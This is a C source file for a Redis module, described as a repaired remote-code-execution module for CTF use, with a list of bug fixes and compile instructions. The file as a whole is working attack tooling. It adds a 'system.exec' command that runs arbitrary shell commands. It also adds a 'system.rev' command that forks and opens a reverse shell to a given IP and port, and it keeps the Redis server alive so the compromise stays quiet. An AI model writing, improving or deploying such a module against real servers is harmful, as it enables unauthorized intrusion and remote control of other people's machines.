/*
 * exp.c — Fixed Redis RCE module for CTF use
 *
 * Registers two commands:
 *   system.exec <cmd>   — execute a shell command and return output
 *   system.rev <ip> <port> — spawn a reverse shell (fork'd, won't kill Redis)
 *
 * Bugs fixed from the original n0b0dyCN version:
 *   1. output buffer was never zeroed → strcat on garbage → segfault/corrupt output
 *   2. fgets used sizeof(buf) which is sizeof(char*) = 8, not the buffer size
 *   3. realloc doubled with <<2 (4x) but size tracker used <<1 (2x) → mismatch
 *   4. RevShellCommand called execve() without fork() → killed the Redis process
 *   5. Missing includes for string.h, arpa/inet.h
 *   6. No free() on allocated memory → leak per command
 *   7. No null-termination safety on output buffer after realloc
 *
 * Compile:
 *   gcc -shared -fPIC -fno-stack-protector -nostartfiles -o exp.so exp.c
 */

#include "redismodule.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <errno.h>
#include <sys/wait.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

/*
 * system.exec <command>
 * Execute a shell command via popen() and return the combined output.
 */
int DoCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc != 2) {
        return RedisModule_WrongArity(ctx);
    }

    size_t cmd_len;
    const char *cmd = RedisModule_StringPtrLen(argv[1], &cmd_len);

    FILE *fp = popen(cmd, "r");
    if (!fp) {
        RedisModule_ReplyWithError(ctx, "ERR popen failed");
        return REDISMODULE_OK;
    }

    size_t buf_size = 4096;    /* read chunk size */
    size_t out_cap  = 4096;    /* output buffer capacity */
    size_t out_len  = 0;       /* bytes written so far */

    char *buf    = (char *)malloc(buf_size);
    char *output = (char *)malloc(out_cap);

    if (!buf || !output) {
        if (buf)    free(buf);
        if (output) free(output);
        pclose(fp);
        RedisModule_ReplyWithError(ctx, "ERR malloc failed");
        return REDISMODULE_OK;
    }

    output[0] = '\0';  /* FIX #1: zero-initialize output so strcat works */

    /* FIX #2: use buf_size, not sizeof(buf) which is just sizeof(char*) */
    while (fgets(buf, buf_size, fp) != NULL) {
        size_t chunk_len = strlen(buf);

        /* Grow output buffer if needed */
        while (out_len + chunk_len + 1 > out_cap) {
            out_cap *= 2;  /* FIX #3: consistent doubling */
            char *tmp = (char *)realloc(output, out_cap);
            if (!tmp) {
                /* bail out with what we have */
                break;
            }
            output = tmp;
        }

        memcpy(output + out_len, buf, chunk_len);
        out_len += chunk_len;
        output[out_len] = '\0';
    }

    pclose(fp);

    RedisModuleString *ret = RedisModule_CreateString(ctx, output, out_len);
    RedisModule_ReplyWithString(ctx, ret);
    RedisModule_FreeString(ctx, ret);

    /* FIX #6: free allocated memory */
    free(buf);
    free(output);

    return REDISMODULE_OK;
}


/*
 * system.rev <ip> <port>
 * Spawn a reverse shell to the given address.
 * FIX #4: fork() first so Redis stays alive.
 */
int RevShellCommand(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (argc != 3) {
        return RedisModule_WrongArity(ctx);
    }

    size_t len;
    const char *ip     = RedisModule_StringPtrLen(argv[1], &len);
    const char *port_s = RedisModule_StringPtrLen(argv[2], &len);
    int port = atoi(port_s);

    /* FIX #4: fork so we don't replace the Redis process with /bin/sh */
    pid_t pid = fork();

    if (pid < 0) {
        RedisModule_ReplyWithError(ctx, "ERR fork failed");
        return REDISMODULE_OK;
    }

    if (pid == 0) {
        /* ── Child process: connect back and exec shell ── */

        /* Detach from Redis's signal handlers and session */
        setsid();

        int s = socket(AF_INET, SOCK_STREAM, 0);
        if (s < 0) _exit(1);

        struct sockaddr_in sa;
        memset(&sa, 0, sizeof(sa));
        sa.sin_family      = AF_INET;
        sa.sin_addr.s_addr = inet_addr(ip);
        sa.sin_port        = htons(port);

        if (connect(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
            close(s);
            _exit(1);
        }

        dup2(s, 0);
        dup2(s, 1);
        dup2(s, 2);
        close(s);

        char *args[] = {"/bin/sh", NULL};
        execve("/bin/sh", args, NULL);

        /* If execve fails */
        _exit(1);
    }

    /* ── Parent (Redis) continues ── */
    RedisModule_ReplyWithSimpleString(ctx, "OK");
    return REDISMODULE_OK;
}


/*
 * Module initialization — register system.exec and system.rev
 */
int RedisModule_OnLoad(RedisModuleCtx *ctx, RedisModuleString **argv, int argc) {
    if (RedisModule_Init(ctx, "system", 1, REDISMODULE_APIVER_1)
            == REDISMODULE_ERR)
        return REDISMODULE_ERR;

    if (RedisModule_CreateCommand(ctx, "system.exec",
            DoCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;

    if (RedisModule_CreateCommand(ctx, "system.rev",
            RevShellCommand, "readonly", 1, 1, 1) == REDISMODULE_ERR)
        return REDISMODULE_ERR;

    return REDISMODULE_OK;
}
